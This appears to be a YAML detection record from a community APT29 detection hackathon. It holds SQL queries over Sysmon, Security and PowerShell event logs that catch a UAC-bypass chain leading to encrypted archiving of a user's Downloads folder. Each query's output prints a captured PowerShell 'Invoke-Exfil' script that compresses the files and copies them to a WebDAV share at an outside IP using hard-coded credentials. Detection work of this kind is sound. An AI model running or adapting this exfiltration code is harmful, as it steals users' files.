vendor: OTR Community
step: 7.B.3
procedure: Encrypted data from the user's Downloads directory using PowerShell
criteria: powershell.exe executing Compress-7Zip with the password argument used for encryption
technique:
  name: Data Encrypted
  id: T1022
issue: https://github.com/OTRF/detection-hackathon-apt29/issues/17
detections:
  - main_type: Telemetry
    modifier_type: Correlated
    description: Telemetry showed powershell.exe executing Compress-7Zip with arguments for encryption. The event was correlated to a parent alert for Bypass User Account Control of control.exe spawning powershell.exe.
    reference:
    queries:
      - id: 4C19DDB9-9763-4D1C-9B9D-788ECF193778
        data_sources:
          - event_provider: Microsoft-Windows-Sysmon/Operational
            event_logs:
              - 1
          - event_provider: Microsoft-Windows-PowerShell/Operational
            event_logs:
              - 4104
        rule_contribution:
        logic: |
          SELECT f.ScriptBlockText
          FROM apt29Host f
          INNER JOIN (
            SELECT d.ProcessId, d.ParentProcessId
            FROM apt29Host d
            INNER JOIN (
              SELECT a.ProcessGuid, a.ParentProcessGuid
              FROM apt29Host a
              INNER JOIN (
                SELECT ProcessGuid
                FROM apt29Host
                WHERE Channel = "Microsoft-Windows-Sysmon/Operational"
                    AND EventID = 1
                    AND LOWER(Image) LIKE "%control.exe"
                    AND LOWER(ParentImage) LIKE "%sdclt.exe"
              ) b
              ON a.ParentProcessGuid = b.ProcessGuid
              WHERE a.Channel = "Microsoft-Windows-Sysmon/Operational"
                AND a.EventID = 1
                AND a.IntegrityLevel = "High"
            ) c
            ON d.ParentProcessGuid= c.ProcessGuid
            WHERE d.Channel = "Microsoft-Windows-Sysmon/Operational"
              AND d.EventID = 1
              AND d.Image LIKE '%powershell.exe'
          ) e
          ON f.ExecutionProcessID = e.ProcessId
          WHERE f.Channel = "Microsoft-Windows-PowerShell/Operational"
              AND f.EventID = 4104
              AND LOWER(f.ScriptBlockText) LIKE "%compress-7zip%"
        output: |
          function Invoke-Exfil {

            if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }
        
            Write-Host "[*] Compressing all the things in download dir"
            Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"
        
            $UserName = "cozy"
            $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
            $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password
        
            $WebDavShare = "WebDavShare"
            $uri = "\\192.168.0.4\webdav"
        
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
            
            Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
            New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds
        
            Write-Host "[*] Copying data to WebDavShare"
            Copy-Item "$env:APPDATA\OfficeSupplies.7z" "WebDavShare:\OfficeSupplies.7z" -Force
        
            Write-Host "[*] Removing temporary network share"
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue
        
            Invoke-BeachCleanup
          }
      - id: C670DAFF-B1FD-45B2-9DEB-AC5AEC273EE7
        data_sources:
          - event_provider: Security
            event_logs:
              - 4688
          - event_provider: Microsoft-Windows-PowerShell/Operational
            event_logs:
              - 4104
        rule_contribution:
        logic: |
          SELECT f.ScriptBlockText
          FROM apt29Host f
          INNER JOIN (
            SELECT split(d.NewProcessId, '0x')[1] as NewProcessId
            FROM apt29Host d
            INNER JOIN(
              SELECT a.ProcessId, a.NewProcessId
              FROM apt29Host a
              INNER JOIN (
                SELECT NewProcessId
                FROM apt29Host
                WHERE LOWER(Channel) = "security"
                    AND EventID = 4688
                    AND LOWER(NewProcessName) LIKE "%control.exe"
                    AND LOWER(ParentProcessName) LIKE "%sdclt.exe"
              ) b
              ON a.ProcessId = b.NewProcessId
              WHERE LOWER(a.Channel) = "security"
                AND a.EventID = 4688
                AND a.MandatoryLabel = "S-1-16-12288"
                AND a.TokenElevationType = "%%1937"
            ) c
            ON d.ProcessId = c.NewProcessId
            WHERE LOWER(d.Channel) = "security"
              AND d.EventID = 4688
              AND d.NewProcessName LIKE '%powershell.exe'
          ) e
          ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId
          WHERE f.Channel = "Microsoft-Windows-PowerShell/Operational"
          AND f.EventID = 4104
          AND LOWER(f.ScriptBlockText) LIKE "%compress-7zip%"
        output: |
          function Invoke-Exfil {

            if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }
        
            Write-Host "[*] Compressing all the things in download dir"
            Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"
        
            $UserName = "cozy"
            $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
            $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password
        
            $WebDavShare = "WebDavShare"
            $uri = "\\192.168.0.4\webdav"
        
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
            
            Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
            New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds
        
            Write-Host "[*] Copying data to WebDavShare"
            Copy-Item "$env:APPDATA\OfficeSupplies.7z" "WebDavShare:\OfficeSupplies.7z" -Force
        
            Write-Host "[*] Removing temporary network share"
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue
        
            Invoke-BeachCleanup
          }
